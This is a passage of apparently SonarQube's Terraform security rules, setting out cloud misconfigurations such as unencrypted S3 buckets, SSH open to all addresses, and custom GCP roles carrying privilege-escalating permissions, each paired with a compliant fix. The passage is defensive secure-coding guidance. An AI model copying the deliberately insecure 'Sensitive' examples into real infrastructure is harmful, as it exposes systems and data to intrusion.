  member &#61; &#34;user:name&#64;example.com&#34;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6245">
              terraform:S6245
            </a>
          </td>
          <td>
            <details>
              <p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul><li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul><li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li></ul>  </li><li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul><li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li></ul>  </li><li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul><li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li></ul>  </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; { # Sensitive
  bucket &#61; &#34;example&#34;
}
</pre>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-managed keys is used for AWS provider version 3 or below:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;

  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm &#61; &#34;AES256&#34;
      }
    }
  }
}
</pre>
<p>Server-side encryption with Amazon S3-managed keys is used for AWS provider version 4 or above:</p>
<pre>
resource &#34;aws_s3_bucket&#34; &#34;example&#34; {
  bucket &#61; &#34;example&#34;
}

resource &#34;aws_s3_bucket_server_side_encryption_configuration&#34; &#34;example&#34; {
  bucket &#61; aws_s3_bucket.example.bucket

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm &#61; &#34;AES256&#34;
    }
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html" rel="nofollow">AWS documentation</a> - Protecting data using
  server-side encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6402">
              terraform:S6402
            </a>
          </td>
          <td>
            <details>
              <p>Domain Name Systems (DNS) are vulnerable by default to various types of attacks.</p>
<p>One of the biggest risks is DNS cache poisoning, which occurs when a DNS accepts spoofed DNS data, caches the malicious records, and potentially
sends them later in response to legitimate DNS request lookups. This attack typically relies on the attacker’s <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack" rel="nofollow">MITM</a> ability on the network and can be used to redirect users from an intended
website to a malicious website.</p>
<p>To prevent these vulnerabilities, Domain Name System Security Extensions (DNSSEC) ensure the integrity and authenticity of DNS data by digitally
signing DNS zones.</p>
<p>The public key of a DNS zone used to validate signatures can be trusted as DNSSEC is based on the following chain of trust:</p>
<ul><li> The parent DNS zone adds a &#34;fingerprint&#34; of the public key of the child zone in a &#34;DS record&#34;. </li><li> The parent DNS zone signs it with its own private key. </li><li> And this process continues until the root zone. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>The parent DNS zone (likely managed by the DNS registrar of the domain name) supports DNSSEC and</p>
<ul><li> The DNS zone is public (contains data such as public reachable IP addresses). </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use DNSSEC when creating private and public DNS zones.</p>
<p>Private DNS zones cannot be queried on the Internet and provide DNS name resolution for private networks. The risk of MITM attacks might be
considered low on these networks and therefore implementing DNSSEC is still recommended but not with a high priority.</p>
<p>Note: Choose a robust signing algorithm when setting up DNSSEC, such as <code>rsasha256</code>. The <a href="https://en.wikipedia.org/wiki/SHA-1" rel="nofollow">insecure</a> <code>rsasha1</code> algorithm should no longer be used.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;google_dns_managed_zone&#34; &#34;example&#34; { # Sensitive: dnssec_config is missing
  name     &#61; &#34;foobar&#34;
  dns_name &#61; &#34;foo.bar.&#34;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;google_dns_managed_zone&#34; &#34;example&#34; {
  name     &#61; &#34;foobar&#34;
  dns_name &#61; &#34;foo.bar.&#34;

  dnssec_config {
    default_key_specs {
      algorithm &#61; &#34;rsasha256&#34;
    }
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cloud.google.com/dns/docs/dnssec-config" rel="nofollow">GCP Documentation</a> - Manage DNSSEC configuration </li><li> <a href="https://cwe.mitre.org/data/definitions/345" rel="nofollow">MITRE, CWE-345</a> - Insufficient Verification of Data Authenticity </li><li> <a href="https://cwe.mitre.org/data/definitions/353" rel="nofollow">MITRE, CWE-353</a> - Missing Support for Integrity Check </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6401">
              terraform:S6401
            </a>
          </td>
          <td>
            <details>
              <p>The likelihood of security incidents increases when cryptographic keys are used for a long time. Thus, to strengthen the data protection it’s
recommended to rotate the symmetric keys created with the Google Cloud Key Management Service (KMS) automatically and periodically. Note that it’s not
possible in GCP KMS to rotate asymmetric keys automatically.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The cryptographic key is a symmetric key. </li><li> The application requires compliance with some security standards like PCI-DSS. </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to rotate keys automatically and regularly. The shorter the key period, the less data can be decrypted by an attacker if a key is
compromised. So the key rotation period usually depends on the amount of data encrypted with a key or other requirements such as compliance with
security standards. In general, a period of time of 90 days can be used.</p>
<h2>Sensitive Code Example</h2>
<pre>
resource &#34;google_kms_crypto_key&#34; &#34;noncompliant-key&#34; { # Sensitive: no rotation period is defined
  name            &#61; &#34;example&#34;
  key_ring        &#61; google_kms_key_ring.keyring.id
}
</pre>
<h2>Compliant Solution</h2>
<pre>
resource &#34;google_kms_crypto_key&#34; &#34;compliant-key&#34; {
  name            &#61; &#34;example&#34;
  key_ring        &#61; google_kms_key_ring.keyring.id
  rotation_period &#61; &#34;7776000s&#34; # 90 days
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cloud.google.com/kms/docs/key-rotation" rel="nofollow">GCP Documentation</a> - KMS Key rotation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6408">
              terraform:S6408
            </a>
          </td>
          <td>
            <details>
              <p>Creating custom roles that allow privilege escalation can allow attackers to maliciously exploit an organization’s cloud resources.</p>
<p>Certain GCP permissions allow impersonation of one or more privileged principals within a GCP infrastructure.<br /> To prevent privilege escalation
after an account has been compromised, proactively follow GCP Security Insights and ensure that custom roles contain as few privileges as possible
that allow direct or indirect impersonation.</p>
<p>For example, privileges like <code>deploymentmanager.deployments.create</code> allow impersonation of service accounts, even if the name does not
sound like it.<br /> Other privileges like <code>setIamPolicy</code>, which are more explicit, directly allow their holder to extend their
privileges.</p>
<p>After gaining a foothold in the target infrastructure, sophisticated attackers typically map their newfound roles to understand what is
exploitable.</p>
<p>The riskiest privileges are either:</p>
<ul><li> At the infrastructure level: privileges to perform project, folder, or organization-wide administrative tasks. </li><li> At the resource level: privileges to perform resource-wide administrative tasks. </li></ul>
<p>In either case, the following privileges should be avoided or granted only with caution:</p>
<ul><li> <code><strong>.</strong>.setIamPolicy</code> </li><li> <code>cloudbuilds.builds.create</code> </li><li> <code>cloudfunctions.functions.create</code> </li><li> <code>cloudfunctions.functions.update</code> </li><li> <code>cloudscheduler.jobs.create</code> </li><li> <code>composer.environments.create</code> </li><li> <code>compute.instances.create</code> </li><li> <code>dataflow.jobs.create</code> </li><li> <code>dataproc.clusters.create</code> </li><li> <code>deploymentmanager.deployments.create</code> </li><li> <code>iam.roles.update</code> </li><li> <code>iam.serviceAccountKeys.create</code> </li><li> <code>iam.serviceAccounts.actAs</code> </li><li> <code>iam.serviceAccounts.getAccessToken</code> </li><li> <code>iam.serviceAccounts.getOpenIdToken</code> </li><li> <code>iam.serviceAccounts.implicitDelegation</code> </li><li> <code>iam.serviceAccounts.signBlob</code> </li><li> <code>iam.serviceAccounts.signJwt</code> </li><li> <code>orgpolicy.policy.set</code> </li><li> <code>run.services.create</code> </li><li> <code>serviceusage.apiKeys.create</code> </li><li> <code>serviceusage.apiKeys.list</code> </li><li> <code>storage.hmacKeys.create</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> This role requires impersonation to perform specific tasks with different privileges. </li><li> This custom role is intended for a small group of administrators. </li></ul>
<p>There is a risk if you answered no to these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Use a permission that does not allow privilege escalation.</p>
<h2>Sensitive Code Example</h2>
<p>Lightweight custom role intended for a developer:</p>
<pre>
resource &#34;google_organization_iam_custom_role&#34; &#34;example&#34; {
  permissions &#61; [
    &#34;iam.serviceAccounts.getAccessToken&#34;,     # Sensitive
    &#34;iam.serviceAccounts.getOpenIdToken&#34;,     # Sensitive
    &#34;iam.serviceAccounts.actAs&#34;,              # Sensitive
    &#34;iam.serviceAccounts.implicitDelegation&#34;, # Sensitive
    &#34;resourcemanager.projects.get&#34;,
    &#34;resourcemanager.projects.list&#34;,
    &#34;run.services.create&#34;,
    &#34;run.services.delete&#34;,
    &#34;run.services.get&#34;,
    &#34;run.services.getIamPolicy&#34;,
    &#34;run.services.list&#34;,
    &#34;run.services.update&#34;,
  ]
}
</pre>
<p>Lightweight custom role intended for a read-only user:</p>
<pre>
resource &#34;google_project_iam_custom_role&#34; &#34;example&#34; {
  permissions &#61; [
    &#34;iam.serviceAccountKeys.create&#34;,        # Sensitive
    &#34;iam.serviceAccountKeys.get&#34;,           # Sensitive
    &#34;deploymentmanager.deployments.create&#34;, # Sensitive
    &#34;cloudbuild.builds.create&#34;,             # Sensitive
    &#34;resourcemanager.projects.get&#34;,
    &#34;resourcemanager.projects.list&#34;,
    &#34;run.services.get&#34;,
    &#34;run.services.getIamPolicy&#34;,
    &#34;run.services.list&#34;,
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>Lightweight custom role intended for a developer:</p>
<pre>
resource &#34;google_project_iam_custom_role&#34; &#34;example&#34; {
  permissions &#61; [
    &#34;resourcemanager.projects.get&#34;,
    &#34;resourcemanager.projects.list&#34;,
    &#34;run.services.create&#34;,
    &#34;run.services.delete&#34;,
    &#34;run.services.get&#34;,
    &#34;run.services.getIamPolicy&#34;,
    &#34;run.services.list&#34;,
    &#34;run.services.update&#34;,
  ]
}
</pre>
<p>Lightweight custom role intended for a read-only user:</p>
<pre>
resource &#34;google_project_iam_custom_role&#34; &#34;example&#34; {
  permissions &#61; [
    &#34;resourcemanager.projects.get&#34;,
    &#34;resourcemanager.projects.list&#34;,
    &#34;run.services.get&#34;,
    &#34;run.services.getIamPolicy&#34;,
    &#34;run.services.list&#34;,
  ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cloud.google.com/iam/docs/custom-roles-permissions-support" rel="nofollow">GCP IAM Docs</a> - Support levels for permissions in custom roles
  </li><li> <a href="https://cloud.google.com/iam/docs/understanding-custom-roles" rel="nofollow">GCP IAM Docs</a> - Understanding IAM custom roles </li><li> <a href="https://www.youtube.com/watch?v&#61;Z-JFVJZ-HDA" rel="nofollow">DEFONConference Youtube Video</a> - DEF CON Safe Mode - Dylan Ayrey and Allison Donovan -
  Lateral Movement &amp; Privilege Escalation in GCP </li><li> <a href="https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/" rel="nofollow">Rhino Security Labs</a> - Privilege Escalation
  in Google Cloud Platform - Part 1 (IAM) </li><li> <a href="https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/" rel="nofollow">Rhino Security Labs</a> - Privilege
  Escalation in Google Cloud Platform - Part 2 (Non-IAM) </li><li> <a href="https://www.praetorian.com/blog/google-cloud-platform-gcp-service-account-based-privilege-escalation-paths/" rel="nofollow">Praetorian</a> - Google
  Cloud Platform (GCP) Service Account-based Privilege Escalation paths </li><li> <a href="https://cloud.google.com/iam/docs/manage-policy-insights" rel="nofollow">GCP Docs</a> - Security Insights </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6407">
              terraform:S6407
            </a>
          </td>
          <td>
            <details>
              <p>App Engine supports encryption in transit through TLS. As soon as the app is deployed, it can be requested using <code>appspot.com</code> domains
or custom domains. By default, endpoints accept both clear-text and encrypted traffic. When communication isn’t encrypted, there is a risk that an
attacker could intercept it and read confidential information.</p>
<p>When creating an App Engine, request handlers can be set with different security level for encryption:</p>
<ul><li> <code>SECURE_NEVER</code>: only HTTP requests are allowed (HTTPS requests are redirected to HTTP). </li><li> <code>SECURE_OPTIONAL</code> and <code>SECURE_DEFAULT</code>: both HTTP and HTTPS requests are allowed. </li><li> <code>SECURE_ALWAYS</code>: only HTTPS requests are allowed (HTTP requests are redirected to HTTPS). </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The handler serves confidential data in HTTP responses. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended for App Engine handlers to require TLS for all traffic. It can be achieved by setting the security level to
<code>SECURE_ALWAYS</code>.</p>
<h2>Sensitive Code Example</h2>
<p><code>SECURE_DEFAULT</code>, <code>SECURE_NEVER</code> and <code>SECURE_OPTIONAL</code> are sensitive TLS security level:</p>
<pre>
resource &#34;google_app_engine_standard_app_version&#34; &#34;example&#34; {
  version_id &#61; &#34;v1&#34;
  service    &#61; &#34;default&#34;
  runtime    &#61; &#34;nodejs&#34;

  handlers {
    url_regex                   &#61; &#34;.*&#34;
    redirect_http_response_code &#61; &#34;REDIRECT_HTTP_RESPONSE_CODE_301&#34;
    security_level              &#61; &#34;SECURE_OPTIONAL&#34; # Sensitive
    script {
      script_path &#61; &#34;auto&#34;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>Force the use of TLS for the handler by setting the security level on <code>SECURE_ALWAYS</code>:</p>
<pre>
resource &#34;google_app_engine_standard_app_version&#34; &#34;example&#34; {
  version_id &#61; &#34;v1&#34;
  service    &#61; &#34;default&#34;
  runtime    &#61; &#34;nodejs&#34;

  handlers {
    url_regex                   &#61; &#34;.*&#34;
    redirect_http_response_code &#61; &#34;REDIRECT_HTTP_RESPONSE_CODE_301&#34;
    security_level              &#61; &#34;SECURE_ALWAYS&#34;
    script {
      script_path &#61; &#34;auto&#34;
    }
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://cloud.google.com/appengine/docs/standard/nodejs/application-security" rel="nofollow">GCP Documentation</a> - Overview of App Security </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6409">
              terraform:S6409
            </a>
          </td>
          <td>
            <details>
              <p>Enabling Legacy Authorization, Attribute-Based Access Control (ABAC), on Google Kubernetes Engine resources can reduce an organization’s ability to
protect itself against access controls being compromised.</p>
<p>For Kubernetes, Attribute-Based Access Control has been superseded by Role-Based Access Control. ABAC is not under active development anymore and
thus should be avoided.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This resource is essential for the information system infrastructure. </li><li> This resource is essential for mission-critical functions. </li><li> Compliance policies require access to this resource to be enforced through the use of Role-Based Access Control. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Unless you are relying on ABAC, leave it disabled.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://cloud.google.com/kubernetes-engine" rel="nofollow">Google Kubernetes Engine</a>:</p>
<pre>
resource &#34;google_container_cluster&#34; &#34;example&#34; {
  enable_legacy_abac &#61; true # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://cloud.google.com/kubernetes-engine" rel="nofollow">Google Kubernetes Engine</a>:</p>
<pre>
resource &#34;google_container_cluster&#34; &#34;example&#34; {
  enable_legacy_abac &#61; false
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Boken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#leave_abac_disabled" rel="nofollow">Google Cloud Documentation</a> -
  Hardening your cluster’s security </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6321">
              terraform:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS, Azure, or GCP support virtual firewalls that can be used to restrict access to services by controlling inbound and
outbound traffic.<br /> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services
traditionally listen, such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1&#61;h_ls" rel="nofollow">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>An ingress rule allowing all inbound SSH traffic for AWS:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource &#34;aws_security_group&#34; &#34;noncompliant&#34; {
  name        &#61; &#34;allow_ssh_noncompliant&#34;
  description &#61; &#34;allow_ssh_noncompliant&#34;
  vpc_id      &#61; aws_vpc.main.id

  ingress {
    description      &#61; &#34;SSH rule&#34;
    from_port        &#61; 22
    to_port          &#61; 22
    protocol         &#61; &#34;tcp&#34;
    cidr_blocks      &#61; [&#34;0.0.0.0/0&#34;]  # Noncompliant
  }
}
</pre>
<p>A security rule allowing all inbound SSH traffic for Azure:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
resource &#34;azurerm_network_security_rule&#34; &#34;noncompliant&#34; {
  priority                    &#61; 100
  direction                   &#61; &#34;Inbound&#34;
  access                      &#61; &#34;Allow&#34;
  protocol                    &#61; &#34;Tcp&#34;
  source_port_range           &#61; &#34;*&#34;
  destination_port_range      &#61; &#34;22&#34;
  source_address_prefix       &#61; &#34;*&#34;  # Noncompliant
  destination_address_prefix  &#61; &#34;*&#34;
}
</pre>
<p>A firewall rule allowing all inbound SSH traffic for GCP:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
resource &#34;google_compute_firewall&#34; &#34;noncompliant&#34; {
  network &#61; google_compute_network.default.name

  allow {
    protocol &#61; &#34;tcp&#34;
    ports    &#61; [&#34;22&#34;]
  }

  source_ranges &#61; [&#34;0.0.0.0/0&#34;]  # Noncompliant
}
</pre>
<p>A security rule allowing all inbound SSH traffic for Azure:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource &#34;azurerm_network_security_rule&#34; &#34;noncompliant&#34; {
  priority                    &#61; 100
  direction                   &#61; &#34;Inbound&#34;
  access                      &#61; &#34;Allow&#34;
  protocol                    &#61; &#34;Tcp&#34;
  source_port_range           &#61; &#34;*&#34;
  destination_port_range      &#61; &#34;22&#34;
  source_address_prefix       &#61; &#34;*&#34;  # Noncompliant
  destination_address_prefix  &#61; &#34;*&#34;
}
</pre>
<h4>Compliant solution</h4>
<p>An ingress rule allowing inbound SSH traffic from specific IP addresses for AWS:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource &#34;aws_security_group&#34; &#34;compliant&#34; {
  name        &#61; &#34;allow_ssh_compliant&#34;
  description &#61; &#34;allow_ssh_compliant&#34;
  vpc_id      &#61; aws_vpc.main.id

  ingress {
    description      &#61; &#34;SSH rule&#34;
    from_port        &#61; 22
    to_port          &#61; 22
    protocol         &#61; &#34;tcp&#34;
    cidr_blocks      &#61; [&#34;1.2.3.0/24&#34;]
  }
}
</pre>
<p>A security rule allowing inbound SSH traffic from specific IP addresses for Azure:</p>
<pre data-diff-id="2" data-diff-type="compliant">
resource &#34;azurerm_network_security_rule&#34; &#34;compliant&#34; {
  priority                    &#61; 100
  direction                   &#61; &#34;Inbound&#34;
  access                      &#61; &#34;Allow&#34;
  protocol                    &#61; &#34;Tcp&#34;
  source_port_range           &#61; &#34;*&#34;
  destination_port_range      &#61; &#34;22&#34;
  source_address_prefix       &#61; &#34;1.2.3.0&#34;
  destination_address_prefix  &#61; &#34;*&#34;
}
</pre>
<p>A firewall rule allowing inbound SSH traffic from specific IP addresses for GCP:</p>
<pre data-diff-id="3" data-diff-type="compliant">
resource &#34;google_compute_firewall&#34; &#34;compliant&#34; {
  network &#61; google_compute_network.default.name

  allow {
    protocol &#61; &#34;tcp&#34;
    ports    &#61; [&#34;22&#34;]
  }

  source_ranges &#61; [&#34;10.0.0.1/32&#34;]
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html" rel="nofollow">AWS Documentation</a> - Security groups for your VPC </li><li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview" rel="nofollow">Azure Documentation</a> - Network security
  groups </li><li> <a href="https://cloud.google.com/vpc/docs/using-firewalls" rel="nofollow">GCP Documentation</a> - Firewalls </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6364">
              terraform:S6364
            </a>
          </td>
          <td>
            <details>
              <p>Reducing the backup retention duration can reduce an organization’s ability to re-establish service in case of a security incident.</p>
<p>Data backups allow to overcome corruption or unavailability of data by recovering as efficiently as possible from a security incident.</p>
<p>Backup retention duration, coverage, and backup locations are essential criteria regarding functional continuity.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This component is essential for the information system infrastructure. </li><li> This component is essential for mission-critical functions. </li><li> Compliance policies require this component to be backed up for a specific amount of time. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Increase the backup retention period to an amount of time sufficient enough to be able to restore service in case of an incident.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/rds/" rel="nofollow">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
resource &#34;aws_db_instance&#34; &#34;example&#34; {
  backup_retention_period &#61; 2 # Sensitive
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/cosmos-db/introduction" rel="nofollow">Azure Cosmos DB</a> accounts:</p>
<pre>
resource &#34;azurerm_cosmosdb_account&#34; &#34;example&#34; {
  backup {
    type &#61; &#34;Periodic&#34;
    retention_in_hours &#61; 8 # Sensitive
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/rds/" rel="nofollow">Amazon Relational Database Service</a> clusters and instances:</p>
<pre>
resource &#34;aws_db_instance&#34; &#34;example&#34; {
  backup_retention_period &#61; 5
}
</pre>
<p>For <a href="https://docs.microsoft.com/en-us/azure/cosmos-db/introduction" rel="nofollow">Azure Cosmos DB</a> accounts:</p>
<pre>
resource &#34;azurerm_cosmosdb_account&#34; &#34;example&#34; {
  backup {
    type &#61; &#34;Periodic&#34;
    retention_in_hours &#61; 300
  }
}
</pre>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6281">
              terraform:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies to be set on a S3 bucket the following settings can be configured:</p>
<ul><li> <code>BlockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li><li> <code>IgnorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li><li> <code>BlockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li><li> <code>RestrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive data. </li><li> The S3 bucket is not used to store static resources of websites (images, css …​). </li><li> Many users have the permission to set ACL or policy to the S3 bucket. </li><li> These settings are not already enforced to true at the account level. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul><li> <code>BlockPublicAcls</code> to <code>true</code> to block new attempts to set public ACLs. </li><li> <code>IgnorePublicAcls</code> to <code>true</code> to block existing public ACLs. </li><li> <code>BlockPublicPolicy</code> to <code>true</code> to block new attempts to set public policies. </li><li> <code>RestrictPublicBuckets</code> to <code>true</code> to restrict existing public policies. </li></ul>
<h2>Sensitive Code Example</h2>
